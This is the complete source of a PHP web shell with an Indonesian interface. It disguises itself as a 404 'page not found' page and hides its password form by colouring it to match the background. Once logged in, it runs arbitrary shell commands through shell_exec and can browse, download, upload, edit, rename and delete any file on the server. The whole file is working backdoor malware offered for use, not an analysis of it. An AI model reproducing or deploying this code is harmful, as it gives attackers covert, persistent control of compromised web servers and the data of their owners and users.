
<?php
session_start();
$password = "dc8af625f93a79bf2de0cff5a7272451";

function login_shell()
{
?>
<!DOCTYPE html>
<html lang="en-us"
    prefix="content: http://purl.org/rss/1.0/modules/content/ dc: http://purl.org/dc/terms/ foaf: http://xmlns.com/foaf/0.1/ og: http://ogp.me/ns# rdfs: http://www.w3.org/2000/01/rdf-schema# sioc: http://rdfs.org/sioc/ns# sioct: http://rdfs.org/sioc/types# skos: http://www.w3.org/2004/02/skos/core# xsd: http://www.w3.org/2001/XMLSchema#">

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <style type="text/css">
        @charset "UTF-8";

        [ng\:cloak],
        [ng-cloak],
        [data-ng-cloak],
        [x-ng-cloak],
        .ng-cloak,
        .x-ng-cloak,
        .ng-hide:not(.ng-hide-animate) {
            display: none !important;
        }

        ng\:form {
            display: block;
        }

        .ng-animate-shim {
            visibility: hidden;
        }

        .ng-anchor {
            position: absolute;
        }
    </style>
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>This Page Does Not Exist</title>
    <meta name="description" content="Oops, looks like the page is lost.">
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
    <link href="https://fonts.googleapis.com/css?family=DM+Sans:300,300i,400,400i,600,600i,700,700i,800,800i"
        rel="stylesheet">
    <link href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,600,600i,700,700i,800,800i"
        rel="stylesheet">

    <script type="text/javascript" async=""
        src="https://www.googletagmanager.com/gtag/js?id=G-9Q6H0QETRF&amp;cx=c&amp;_slc=1"></script>
    <script async="" src="https://www.google-analytics.com/analytics.js"></script>
    <script>
        (function (i, s, o, g, r, a, m) {
            i['GoogleAnalyticsObject'] = r; i[r] = i[r] || function () {
                (i[r].q = i[r].q || []).push(arguments)
            }, i[r].l = 1 * new Date(); a = s.createElement(o),
                m = s.getElementsByTagName(o)[0]; a.async = 1; a.src = g; m.parentNode.insertBefore(a, m)
        })(window, document, 'script', 'https://www.google-analytics.com/analytics.js', 'ga');

        ga('create', 'UA-26575989-46', 'auto');
        ga('send', 'pageview');

    </script>
</head>

<body>
    <iframe allow="join-ad-interest-group" data-tagging-id="G-9Q6H0QETRF" data-load-time="1744709464093" height="0"
        width="0"
        src="https://td.doubleclick.net/td/ga/rul?tid=G-9Q6H0QETRF&amp;gacid=1669583486.1744709463&amp;gtm=45je54b0v9125959112za200&amp;dma=1&amp;dma_cps=syphamo&amp;gcd=13l3lPl2l2l1&amp;npa=0&amp;pscdl=noapi&amp;aip=1&amp;fledge=1&amp;frm=0&amp;tag_exp=102509683~102803279~102813109~102887800~102926062~103021830~103027016~103051953~103055465~103077950&amp;z=2108504389"
        style="display: none; visibility: hidden;">
    </iframe>
    <div class="page-not-found">
        <img class="image" alt="Page Not Found" src="/htdocs_error/page_not_found.svg" />
        <h1 class="title">This Page Does Not Exist</h1>
        <p class="text">
            Sorry, the page you are looking for could not be found. It's just an
            accident that was not intentional.
        </p>

        <form action="" method="post" class="login-container">
            <div align="center">
                <input type="password" name="pass" placeholder="Password" required>
                <input type="submit" name="submit" value="Login">
            </div>
        </form>
    </div>
</body>
    <style>
        body {
            color: #1d1e20;
            background: #f4f5ff;
            font-size: 14px;
            font-family: "DM Sans", "Roboto", sans-serif !important;
            font-weight: 400;
            -ms-text-size-adjust: 100%;
            -webkit-font-smoothing: antialiased;
            -moz-osx-font-smoothing: grayscale;
        }

        .page-not-found {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            padding: 0 16px;
        }

        .page-not-found img {
            max-width: 100%;
            margin-bottom: 32px;
            height: auto;
            object-fit: contain;
        }

        .title {
            text-align: center;
            margin-top: 0;
            margin-bottom: 8px;
            font-size: 24px;
            line-height: 32px;
            font-weight: 700;
            color: #000; /* Pastikan kontras */
        }

        .text {
            text-align: center;
            max-width: 650px;
            margin-bottom: 24px;
            font-size: 16px;
            line-height: 24px;
            font-weight: 400;
            color: #6D7081;
        }

        /* Form login dibuat tidak kelihatan */
        .login-container {
            background: #f4f5ff; /* sama dengan background body */
            border-radius: 8px;
            box-shadow: none;
            color: #f4f5ff;
        }

        .login-container input[type="password"] {
            padding: 10px;
            margin-right: 10px;
            border: 1px solid #f4f5ff;
            border-radius: 4px;
            background: #f4f5ff;
            color: #000000;
            outline: none;
        }

        .login-container input[type="password"]::placeholder {
            color: #f4f5ff;
        }

        .login-container input[type="submit"] {
            padding: 10px 20px;
            border: none;
            border-radius: 4px;
            background: #f4f5ff;
            color: #f4f5ff;
            cursor: pointer;
            outline: none;
        }

        .login-container input[type="submit"]:hover {
            background: #f4f5ff;
        }
    </style>

</html>
<?php
    exit;
}
if (!isset($_SESSION[md5($_SERVER['HTTP_HOST'])])) {
    if (isset($_POST['pass']) && (md5($_POST['pass']) == $password)) {
        $_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
        header("refresh: 0;");
    } else {
        login_shell();
    }
?>
    <?php
    exit;
}

$baseDir = realpath(getcwd());
$path = isset($_GET['path']) ? realpath($_GET['path']) : $baseDir;

if ($path === false || !is_dir($path)) {
    $path = $baseDir;
}
if ($path === false || !is_dir($path)) {
    echo "<tr><td colspan='4'>Direktori tidak valid atau tidak ditemukan.</td></tr>";
    $folders = [];
    $files = [];
} else {
    $folders = [];
    $files = [];
    $scandir = scandir($path);
    foreach ($scandir as $item) {
        $fullpath = "$path/$item";
        if (is_dir($fullpath) && $item != '.' && $item != '..') {
            $folders[] = $item;
        } elseif (is_file($fullpath)) {
            $files[] = $item;
        }
    }
}


function downloadFile($file)
{
    if (file_exists($file)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($file) . '"');
        header('Expires: 0');
        header('Cache-Control: must-revalidate');
        header('Pragma: public');
        header('Content-Length: ' . filesize($file));
        readfile($file);
        exit;
    } else {
        echo "<script>alert('File tidak ditemukan!');</script>";
    }
}

function getPermissions($file) {
    $perms = fileperms($file);

    switch ($perms & 0xF000) {
        case 0xC000: $info = 's'; break;
        case 0xA000: $info = 'l'; break;
        case 0x8000: $info = '-'; break;
        case 0x6000: $info = 'b'; break;
        case 0x4000: $info = 'd'; break;
        case 0x2000: $info = 'c'; break;
        case 0x1000: $info = 'p'; break;
        default: $info = 'u';
    }

    $info .= (($perms & 0x0100) ? 'r' : '-');
    $info .= (($perms & 0x0080) ? 'w' : '-');
    $info .= (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x') : (($perms & 0x0800) ? 'S' : '-'));
    $info .= (($perms & 0x0020) ? 'r' : '-');
    $info .= (($perms & 0x0010) ? 'w' : '-');
    $info .= (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x') : (($perms & 0x0400) ? 'S' : '-'));
    $info .= (($perms & 0x0004) ? 'r' : '-');
    $info .= (($perms & 0x0002) ? 'w' : '-');
    $info .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x') : (($perms & 0x0200) ? 'T' : '-'));

    return $info;
}

if (isset($_GET['download'])) {
    downloadFile($_GET['download']);
}

$cmdResult = null;

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['cmd'])) {
    $cmd = $_POST['cmd'];
    if (is_dir($path)) {
        chdir($path);
    }
    if (is_callable('shell_exec') && !in_array('shell_exec', explode(',', ini_get('disable_functions')))) {
        $cmdResult = shell_exec($cmd . ' 2>&1');
        if (empty($cmdResult)) {
            $cmdResult = "No Output";
        }
    } else {
        $cmdResult = "Not Shell: shell_exec() is disabled on this server.";
    }
}

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action']) && $_POST['action'] === 'upload') {
    if (isset($_FILES['file'])) {
        $fileName = basename($_FILES['file']['name']);
        if (preg_match('/^[a-zA-Z0-9_\-\.]+$/', $fileName)) {
            $targetPath = $path . '/' . $fileName;
            if (move_uploaded_file($_FILES['file']['tmp_name'], $targetPath)) {
                echo "<div class='alert alert-success mt-2' style='max-width: 300px;'>File berhasil diupload!</div>";
            } else {
                echo "<div class='alert alert-danger mt-2' style='max-width: 300px;'>Gagal mengupload file!</div>";
            }
        } else {
            echo "<div class='alert alert-danger mt-2' style='max-width: 300px;'>Nama file tidak valid!</div>";
        }
    }
}

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action']) && $_POST['action'] === 'create_file') {
    if (isset($_POST['name']) && preg_match('/^[a-zA-Z0-9_\-\.]+$/', $_POST['name'])) {
        $filePath = $path . '/' . $_POST['name'];
        if (file_put_contents($filePath, "") !== false) {
            echo "<div class='alert alert-success mt-2' style='max-width: 300px;'>File berhasil dibuat!</div>";
        } else {
            echo "<div class='alert alert-danger mt-2' style='max-width: 300px;'>Gagal membuat file!</div>";
        }
    } else {
        echo "<div class='alert alert-danger mt-2' style='max-width: 300px;'>Nama file tidak valid!</div>";
    }
}

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action']) && $_POST['action'] === 'create_folder') {
    if (isset($_POST['name']) && preg_match('/^[a-zA-Z0-9_\-]+$/', $_POST['name'])) {
        $folderPath = $path . '/' . $_POST['name'];
        if (mkdir($folderPath)) {
            echo "<div class='alert alert-success mt-2' style='max-width: 300px;'>Folder berhasil dibuat!</div>";
        } else {
            echo "<div class='alert alert-danger mt-2' style='max-width: 300px;'>Gagal membuat folder!</div>";
        }
    } else {
        echo "<div class='alert alert-danger mt-2' style='max-width: 300px;'>Nama folder tidak valid!</div>";
    }
}

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action'], $_POST['target'])) {
    $action = $_POST['action'];
    $targetPath = $_POST['target'];

    switch ($action) {
            case 'delete':
                if (is_file($targetPath)) {
                    if (unlink($targetPath)) {
                        echo json_encode(['status' => 'success', 'message' => 'File berhasil dihapus!']);
                    } else {
                        echo json_encode(['status' => 'error', 'message' => 'Gagal menghapus file!']);
                    }
                } elseif (is_dir($targetPath)) {
                    if (rmdir($targetPath)) {
                        echo json_encode(['status' => 'success', 'message' => 'Folder berhasil dihapus!']);
                    } else {
                        echo json_encode(['status' => 'error', 'message' => 'Gagal menghapus folder!']);
                    }
                } else {
                    echo json_encode(['status' => 'error', 'message' => 'Target tidak valid!']);
                }
                exit;

            case 'edit':
                if (isset($_POST['content'])) {
                    $handle = fopen($targetPath, 'w');
                    if ($handle) {
                        fwrite($handle, $_POST['content']);
                        fclose($handle);
                        echo json_encode(['status' => 'success', 'message' => 'File berhasil diedit!']);
                    } else {
                        echo json_encode(['status' => 'error', 'message' => 'Tidak dapat membuka file untuk menulis!']);
                    }
                } else {
                    if (file_exists($targetPath)) {
                        $content = file_get_contents($targetPath);
                        echo json_encode(['status' => 'success', 'content' => $content]);
                    } else {
                        echo json_encode(['status' => 'error', 'message' => 'File tidak ditemukan!']);
                    }
                }
                exit;

            case 'rename':
                if (isset($_POST['new_name'])) {
                    $newPath = dirname($targetPath) . '/' . $_POST['new_name'];
                    if (rename($targetPath, $newPath)) {
                        echo json_encode(['status' => 'success', 'message' => 'Berhasil mengganti nama!']);
                    } else {
                        echo json_encode(['status' => 'error', 'message' => 'Gagal mengganti nama!']);
                    }
                } else {
                    echo json_encode(['status' => 'error', 'message' => 'Nama baru tidak diberikan!']);
                }
                exit;
    }
}
?>
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Repository Philux</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha3/dist/css/bootstrap.min.css" rel="stylesheet">
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha3/dist/js/bootstrap.bundle.min.js"></script>
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <style>
    body {
        background-color: rgb(0, 0, 0);
        color: #fff !important;
        font-family: Arial, sans-serif;
    }

    .table {
        margin: 20px auto;
        width: 90%;
        color: #fff !important;
    }

    .table-striped tbody tr:nth-of-type(odd),
    .table-striped tbody tr:nth-of-type(even) {
        background-color: transparent !important;
    }

    .table-striped tbody tr td {
        color: #fff !important;
    }

    .table-dark {
        background-color: #343a40 !important;
        color: #fff !important;
    }

    .breadcrumb {
        margin-bottom: 20px;
        color: #fff !important;
    }

    .btn {
        margin: 0 5px;
        color: #fff !important;
    }

    .btn-primary {
        background-color: #007bff !important;
        border-color: #007bff !important;
    }

    .btn-danger {
        background-color: #dc3545 !important;
        border-color: #dc3545 !important;
    }

    .btn-warning {
        background-color: #ffc107 !important;
        border-color: #ffc107 !important;
        color: #000 !important;
    }

    .modal textarea {
        width: 100%;
        height: 300px;
        color: #000 !important;
        background-color: #fff !important;
    }

    .shell {
        border-radius: 4px;
        border: 1px solid rgba(255, 255, 255, 0.4);
        font-size: 12px;
        display: flex;
        flex-direction: column;
        align-items: stretch;
        background: #242424;
        color: rgb(145, 255, 0);
        padding: 10px;
        border-radius: 5px;
        overflow: auto;
        white-space: pre-wrap;
    }
    .input-group-text {
    background-color: #000;
    color: rgb(145, 255, 0);
    font-size: 12px;
    padding: 5px 10px;
    }
    .btn-dark {
        background-color: #000;
        color: #fff;
    }
    .btn-dark:hover {
        background-color: #333;
    }
</style>
</head>
<body>
    <div class="container">
        <h1 class="text-center my-4">Repository Philux</h1>

        <div class="d-flex justify-content-between align-items-center mb-3">
            <div>
                <?php
               
                echo "<p>Current Directory: ";
                $paths = explode('/', trim($path, '/'));
                $currentPath = '';

                foreach ($paths as $index => $folder) {
                    $currentPath .= '/' . $folder;
                    echo "<a href='?path=" . htmlspecialchars($currentPath, ENT_QUOTES, 'UTF-8') . "'>$folder</a>";
                    if ($index < count($paths) - 1) {
                        echo " / ";
                    }
                }

               
                echo " <a href='?path=" . htmlspecialchars($baseDir, ENT_QUOTES, 'UTF-8') . "' class='btn btn-sm btn-primary'>[Home]</a>";
                echo "</p>";
                ?>

                <div class="container mt-4">
                    <form method="POST">
                        <div class="input-group mb-3">
                            <span class="input-group-text">
                                <?php
                                $user = get_current_user();
                                $host = gethostname();
                                echo htmlspecialchars("$user@$host:~$");
                                ?>
                            </span>
                            <input class="form-control" type="text" name="cmd" placeholder="Masukkan perintah CMD" style="color: rgb(145, 255, 0); background-color: #000;" required>
                            <button class="btn btn-dark" type="submit"><i class="bi bi-arrow-return-right"></i> Jalankan</button>
                        </div>
                    </form>

                    <?php if ($cmdResult !== null) { ?>
                        <div class="shell">
                            <pre><?php echo htmlspecialchars($cmdResult, ENT_QUOTES, 'UTF-8'); ?></pre>
                        </div>
                    <?php } ?>
                </div>
            </div>

            <div>
                <!-- Tombol untuk fitur tambahan -->
                <form method="POST" class="d-inline">
                    <button type="submit" name="show_upload" class="btn btn-success btn-sm">Upload File</button>
                </form>
                <form method="POST" class="d-inline">
                    <button type="submit" name="show_create_file" class="btn btn-primary btn-sm">Buat File</button>
                </form>
                <form method="POST" class="d-inline">
                    <button type="submit" name="show_create_folder" class="btn btn-warning btn-sm">Buat Folder</button>
                </form>
            </div>
        </div>

        <?php
        // Tampilkan form upload file
        if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['show_upload'])) {
            ?>
            <form method="POST" enctype="multipart/form-data" class="mb-3">
                <input type="hidden" name="action" value="upload">
                <div class="mb-3">
                    <label for="file" class="form-label">Pilih File</label>
                    <input type="file" name="file" id="file" class="form-control form-control-sm" required>
                </div>
                <button type="submit" class="btn btn-success btn-sm">Upload</button>
            </form>
            <?php
        }

        // Tampilkan form buat file
        if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['show_create_file'])) {
            ?>
            <form method="POST" class="mb-3">
                <input type="hidden" name="action" value="create_file">
                <div class="mb-3">
                    <label for="fileName" class="form-label">Nama File</label>
                    <input type="text" name="name" id="fileName" class="form-control form-control-sm" placeholder="Masukkan nama file (contoh: file.txt)" required>
                </div>
                <button type="submit" class="btn btn-primary btn-sm">Buat</button>
            </form>
            <?php
        }

        // Tampilkan form buat folder
        if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['show_create_folder'])) {
            ?>
            <form method="POST" class="mb-3">
                <input type="hidden" name="action" value="create_folder">
                <div class="mb-3">
                    <label for="folderName" class="form-label">Nama Folder</label>
                    <input type="text" name="name" id="folderName" class="form-control form-control-sm" placeholder="Masukkan nama folder" required>
                </div>
                <button type="submit" class="btn btn-warning btn-sm">Buat</button>
            </form>
            <?php
        }
        ?>

        <table class="table table-striped">
            <thead class="table-dark">
                <tr>
                    <th>Nama</th>
                    <th>Ukuran</th>
                    <th>Izin</th>
                    <th>Aksi</th>
                </tr>
            </thead>
            <tbody>
              <?php
                $parentPath = dirname($path);
                if ($parentPath && realpath($parentPath) !== realpath($path)) {
                    echo "<tr>
                        <td><a href='?path=" . htmlspecialchars($parentPath, ENT_QUOTES, 'UTF-8') . "'>Kembali ke " . basename($parentPath) . "</a></td>
                        <td>--</td>
                        <td>--</td>
                        <td>--</td>
                    </tr>";
                }
                
               
                $folders = [];
                $files = [];
                $scandir = scandir($path);
                foreach ($scandir as $item) {
                    $fullpath = "$path/$item";
                    if (is_dir($fullpath) && $item != '.' && $item != '..') {
                        $folders[] = $item;
                    } elseif (is_file($fullpath)) {
                        $files[] = $item;
                    }
                }
                
               
                foreach ($folders as $folder) {
                    $fullpath = rtrim($path, '/') . '/' . $folder;
                    echo "<tr>
                        <td><a href='?path=" . htmlspecialchars($fullpath, ENT_QUOTES, 'UTF-8') . "'>$folder</a></td>
                        <td>--</td>
                        <td>" . getPermissions($fullpath) . "</td>
                        <td>
                            <button class='btn btn-warning btn-sm rename-btn' data-path='" . htmlspecialchars($fullpath, ENT_QUOTES, 'UTF-8') . "'>Rename</button>
                            <button class='btn btn-danger btn-sm delete-btn' data-path='" . htmlspecialchars($fullpath, ENT_QUOTES, 'UTF-8') . "'>Hapus</button>
                        </td>
                    </tr>";
                }
                
               
                foreach ($files as $file) {
                    $fullpath = "$path/$file";
                    $size = round(filesize($fullpath) / 1024, 2) . ' KB';
                    echo "<tr>
                        <td>$file</td>
                        <td>$size</td>
                        <td>" . getPermissions($fullpath) . "</td>
                        <td>
                            <button class='btn btn-primary btn-sm edit-btn' data-path='" . htmlspecialchars($fullpath, ENT_QUOTES, 'UTF-8') . "'>Edit</button>
                            <button class='btn btn-warning btn-sm rename-btn' data-path='" . htmlspecialchars($fullpath, ENT_QUOTES, 'UTF-8') . "'>Rename</button>
                            <button class='btn btn-danger btn-sm delete-btn' data-path='" . htmlspecialchars($fullpath, ENT_QUOTES, 'UTF-8') . "'>Hapus</button>
                            <a href='?download=" . htmlspecialchars($fullpath, ENT_QUOTES, 'UTF-8') . "' class='btn btn-success btn-sm'>Unduh</a>
                        </td>
                    </tr>";
                }
                
                ?>
            </tbody>
        </table>
    </div>

    <div class="modal fade" id="uploadModal" tabindex="-1" aria-labelledby="uploadModalLabel" aria-hidden="true">
        <div class="modal-dialog">
            <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title" id="uploadModalLabel">Upload File</h5>
                    <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                </div>
                <form method="POST" enctype="multipart/form-data" class="mb-3">
                    <input type="hidden" name="action" value="upload">
                    <div class="mb-3">
                        <label for="file" class="form-label">Pilih File</label>
                        <input type="file" name="file" id="file" class="form-control" required>
                    </div>
                    <button type="submit" class="btn btn-success">Upload File</button>
                </form>
            </div>
        </div>
    </div>

    <div class="modal fade" id="createFileModal" tabindex="-1" aria-labelledby="createFileModalLabel" aria-hidden="true">
        <div class="modal-dialog">
            <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title" id="createFileModalLabel">Buat File Baru</h5>
                    <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                </div>
                <form method="POST" class="mb-3">
                    <input type="hidden" name="action" value="create_file">
                    <div class="mb-3">
                        <label for="fileName" class="form-label">Nama File</label>
                        <input type="text" name="name" id="fileName" class="form-control" placeholder="Masukkan nama file (contoh: file.txt)" required>
                    </div>
                    <button type="submit" class="btn btn-primary">Buat File</button>
                </form>
            </div>
        </div>
    </div>

    <div class="modal fade" id="createFolderModal" tabindex="-1" aria-labelledby="createFolderModalLabel" aria-hidden="true">
        <div class="modal-dialog">
            <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title" id="createFolderModalLabel">Buat Folder Baru</h5>
                    <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                </div>
                <form method="POST" class="mb-3">
                    <input type="hidden" name="action" value="create_folder">
                    <div class="mb-3">
                        <label for="folderName" class="form-label">Nama Folder</label>
                        <input type="text" name="name" id="folderName" class="form-control" placeholder="Masukkan nama folder" required>
                    </div>
                    <button type="submit" class="btn btn-warning">Buat Folder</button>
                </form>
            </div>
        </div>
    </div>

    <div class="modal fade" id="editModal" tabindex="-1" aria-labelledby="editModalLabel" aria-hidden="true">
        <div class="modal-dialog modal-lg">
            <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title" id="editModalLabel">Edit File</h5>
                    <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                </div>
                <div class="modal-body">
                    <textarea id="fileContent" class="form-control" rows="10"></textarea>
                </div>
                <div class="modal-footer">
                    <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Tutup</button>
                    <button type="button" class="btn btn-primary save-changes-btn">Simpan Perubahan</button>
                </div>
            </div>
        </div>
    </div>
    <div class="modal fade" id="renameModal" tabindex="-1" aria-labelledby="renameModalLabel" aria-hidden="true">
    <div class="modal-dialog">
        <div class="modal-content">
            <div class="modal-header">
                <h5 class="modal-title" id="renameModalLabel">Ganti Nama</h5>
                <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
            </div>
            <div class="modal-body">
                <input type="text" id="newName" class="form-control" placeholder="Masukkan nama baru">
            </div>
            <div class="modal-footer">
                <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Tutup</button>
                <button type="button" class="btn btn-primary save-rename-btn">Simpan</button>
            </div>
            </div>
        </div>
    </div>

    <script>

    $("#uploadForm").submit(function (e) {
        e.preventDefault();
        const formData = new FormData(this);
        formData.append("action", "upload");
        $.ajax({
            url: "",
            type: "POST",
            data: formData,
            processData: false,
            contentType: false,
            success: function (response) {
                console.log(response); // Tambahkan log ini
                const res = JSON.parse(response);
                if (res.status === "success") {
                    alert(res.message);
                    $("#uploadModal").modal("hide");
                    location.reload();
                } else {
                    alert(res.message);
                }
            },
        });
    });

    $(".save-file-btn").click(function () {
        const fileName = $("#newFileName").val();
        if (fileName.trim() === "") {
            alert("Nama file tidak boleh kosong!");
            return;
        }
        $.post("", { action: "create_file", name: fileName, path: "<?php echo $path; ?>" }, function (response) {
            console.log(response); // Tambahkan log ini
            const res = JSON.parse(response);
            if (res.status === "success") {
                alert(res.message);
                $("#createFileModal").modal("hide");
                location.reload();
            } else {
                alert(res.message);
            }
        });
    });

    $(".save-folder-btn").click(function () {
        const folderName = $("#newFolderName").val();
        if (folderName.trim() === "") {
            alert("Nama folder tidak boleh kosong!");
            return;
        }
        $.post("", { action: "create_folder", name: folderName, path: "<?php echo $path; ?>" }, function (response) {
            console.log(response); // Tambahkan log ini
            const res = JSON.parse(response);
            if (res.status === "success") {
                alert(res.message);
                $("#createFolderModal").modal("hide");
                location.reload();
            } else {
                alert(res.message);
            }
        });
    });

    $(document).on("click", ".delete-btn", function () {
        const path = $(this).data("path");
        if (confirm("Apakah Anda yakin ingin menghapus ini?")) {
            $.post("", { action: "delete", target: path }, function (response) {
                const res = JSON.parse(response);
                if (res.status === "success") {
                    alert(res.message);
                    location.reload();
                } else {
                    alert(res.message);
                }
            });
        }
    });

    $(document).on("click", ".edit-btn", function () {
        const path = $(this).data("path");
        $.post("", { action: "edit", target: path }, function (response) {
            const res = JSON.parse(response);
            if (res.status === "success") {
                $("#fileContent").val(res.content);
                $(".save-changes-btn").data("path", path);
                $("#editModal").modal("show");
            } else {
                alert(res.message);
            }
        });
    });

    $(".save-changes-btn").click(function () {
        const path = $(this).data("path");
        const content = $("#fileContent").val();
        $.post("", { action: "edit", target: path, content: content }, function (response) {
            const res = JSON.parse(response);
            if (res.status === "success") {
                alert(res.message);
                $("#editModal").modal("hide");
                location.reload();
            } else {
                alert(res.message);
            }
        });
    });

    $(document).on("click", ".rename-btn", function () {
    const path = $(this).data("path");
    $("#renameModal").modal("show");
    $(".save-rename-btn").data("path", path);
    });

    $(".save-rename-btn").click(function () {
        const path = $(this).data("path");
        const newName = $("#newName").val();
        if (newName.trim() === "") {
            alert("Nama baru tidak boleh kosong!");
            return;
        }
        $.post("", { action: "rename", target: path, new_name: newName }, function (response) {
            const res = JSON.parse(response);
            if (res.status === "success") {
                alert(res.message);
                $("#renameModal").modal("hide");
                location.reload();
            } else {
                alert(res.message);
            }
        });
    });
</script>
</body>
</html>